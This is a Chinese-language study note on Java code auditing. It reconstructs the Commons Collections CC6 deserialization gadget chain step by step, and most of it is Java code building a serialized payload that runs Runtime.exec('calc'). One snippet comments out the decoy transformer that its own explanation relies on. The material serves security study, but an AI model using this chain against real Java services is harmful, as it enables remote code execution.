cc6不受jdk版本限制，因此更容易去利用

cc6链分析 其实相当于 cc1 + urldns
[[java代码审计cc1链LazyMap版本]]
[[Java代码审计urldns链]]

前半部分类似于cc1链的lazyMap部分从lazyMap到InvokerTransformer
```java
package org.example;  
  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.LazyMap;  
  
import java.lang.reflect.Method;  
import java.util.HashMap;  
import java.util.Map;  
  
public class LazyMapCC6 {  
    public static void main(String[] args) throws Exception {  
        Runtime runtime = Runtime.getRuntime();  
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});  
        Map<String,  String> hashMap = new HashMap<>();  
        Map lazyMap = LazyMap.decorate(hashMap, invokerTransformer);  
        Class<LazyMap> lazyMapClass = LazyMap.class;  
        Method lazyMethod= lazyMapClass.getDeclaredMethod("get", Object.class);  
        lazyMethod.setAccessible(true);  
        lazyMethod.invoke(lazyMap, runtime);  
    }  
}
```
这里cc6的思路就是继续寻找调用LazyMap.get()方法的其他调用处
在TideMapEntry.java文件中发现调用方法getValue
```java
public TiedMapEntry(Map map, Object key) {  
    super();  
    this.map = map;  
    this.key = key;  
}

public Object getKey() {  
    return key;  
}
```
都是public权限，直接调用即可
```java
public class LazyMapCC6 {  
    public static void main(String[] args) throws Exception {  
        Runtime runtime = Runtime.getRuntime();  
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});  
        Map<String,  String> hashMap = new HashMap<>();  
        Map lazyMap = LazyMap.decorate(hashMap, invokerTransformer);  
        Class<LazyMap> lazyMapClass = LazyMap.class;  
        TiedMapEntry expTiedMapEntry = new TiedMapEntry(lazyMap, runtime);  
        expTiedMapEntry.getValue();  
    }  
}
```
接下来再去寻找调用TiedMapEntry.getValue()的调用处
这边发现同类下TiedMapEntry.hashCode方法调用了，这就可以去考虑结合URLDNS链了
HashMap下存在hash方法可以调用，hashCode方法
```java
static final int hash(Object key) {  
    int h;  
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);  
}
```
这里非public权限，可以用反射调用
```java
public class LazyMapCC6 {  
    public static void main(String[] args) throws Exception {  
        Runtime runtime = Runtime.getRuntime();  
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});  
        Map<String,  String> hashMap = new HashMap<>();  
        Map lazyMap = LazyMap.decorate(hashMap, invokerTransformer);  
        Class<LazyMap> lazyMapClass = LazyMap.class;  
        TiedMapEntry expTiedMapEntry = new TiedMapEntry(lazyMap, runtime);  
        Class hashMapClass = HashMap.class;  
        Method expMethod = hashMapClass.getDeclaredMethod("hash", Object.class);  
        expMethod.setAccessible(true);  
        expMethod.invoke(expTiedMapEntry, expTiedMapEntry);  
    }  
}
```
不过同类下HashMap还有一个put方法，此方法可以自动调用hash方法并且为public修饰
```java
public static void main(String[] args) throws Exception {  
    Runtime runtime = Runtime.getRuntime();  
    InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});  
    Map<String,  String> hashMap = new HashMap<>();  
    Map lazyMap = LazyMap.decorate(hashMap, invokerTransformer);  
    Class<LazyMap> lazyMapClass = LazyMap.class;  
    TiedMapEntry expTiedMapEntry = new TiedMapEntry(lazyMap, runtime);  
    Class hashMapClass = HashMap.class;  
    HashMap expHashMap = new HashMap();  
    expHashMap.put(expTiedMapEntry, "tom");  
}
```
然后进行序列化操作会发现可以直接进行命令执行，这一步原理和之前URLDNS链一样，因为hash.put方法会直接触发了hashCode方法
```java
public static void main(String[] args) throws Exception {  
    Transformer[] transformers = new Transformer[]{  
            new ConstantTransformer(Runtime.class),  
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),  
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})  
    };  
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
    HashMap<Object, Object> innerMap = new HashMap();  
    Map expMap = LazyMap.decorate(innerMap, chainedTransformer);  
    TiedMapEntry tiedMapEntry = new TiedMapEntry(expMap, "test");  
    HashMap<Object, Object> hashmap = new HashMap<>();  
    hashmap.put(tiedMapEntry, "value");  
    serialize(hashmap);  
}  
public static void serialize(Object obj) throws IOException {  
    ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
    oos.writeObject(obj);  
}  
public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{  
    ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  
    Object obj = ois.readObject();  
    return obj;  
}
```
我们要保证其在反序列化时才进行命令执行，需要在执行put方法的时候，不让其进行命令执行。
这里可以对lazyMap进行修改，在执行put方法前，给lazyMap的decorate的factory传参点传入一个没用的参数。然后执行完put方法后修改其值为之前的chainedTransformer。
```java
Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),  
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})  
        };  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
        HashMap<Object, Object> map1 = new HashMap<>();  
        Map lazyMap = LazyMap.decorate(map1, chainedTransformer);  
//        Map lazyMap = LazyMap.decorate(map1, new ConstantTransformer("1"));  
        HashMap map2 = new HashMap();  
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "1");  
        map2.put(tiedMapEntry,"2");  
        map1.remove("1");  
        Class c = LazyMap.class;  
        Field f = c.getDeclaredField("factory");  
        f.setAccessible(true);  
        f.set(lazyMap, chainedTransformer);  
        serialize(map2);  
        unserialize("ser.bin");
```
这边map1.remove("1");  这行代码我认为是比较重要的，其作用解释如下
```java
在调用map2.put(tideMapEntry,"2") 会触发TiedMapEntry.hashCode(),进而调用LazpMap的get方法
而如果LazyMap中已经存入键key "1" 那么get会直接返回已有值
LazyMap.java
public Object get(Object key) {  
    // create value for key if key is not currently in the map  
    if (map.containsKey(key) == false) {  
        Object value = factory.transform(key);  
        map.put(key, value);  
        return value;  
    }  
    return map.get(key);  
}
即直接执行 map.get(key)
而不会触发后续的ChainedTransformer调用
通过移除key "1" 可以确保反序列化时才会真正调用ChainedTransformer

```
至此cc6链已成
gadget 
hashmap.readObject-> 
			hashmap.put()
			hashmap.hash()
				TideMapEntry.hashCode()
				 TideMapEntry.getValue()
				      LazyMap.get()
				          ChainedTransformer.transform()  
							InvokerTransformer.transform()  
								Runtime.exec()


